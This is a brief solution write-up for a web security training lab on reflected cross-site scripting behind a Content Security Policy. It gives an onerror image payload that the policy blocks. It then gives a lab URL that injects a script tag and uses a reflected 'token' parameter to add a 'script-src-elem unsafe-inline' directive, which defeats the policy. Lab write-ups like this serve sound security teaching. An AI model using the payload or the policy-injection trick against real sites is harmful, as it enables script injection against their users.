// Lab: Reflected XSS protected by CSP, with CSP bypass

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.
Please note that the intended solution to this lab is only possible in Chrome.



// solution

1. First Inject the payload in Search:

<img src=1 onerror=alert(1)>

then we can see by inspecting that the site is blocked due to Content Security Policy (CSP)


2. Now Inject the payload in URL:

https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
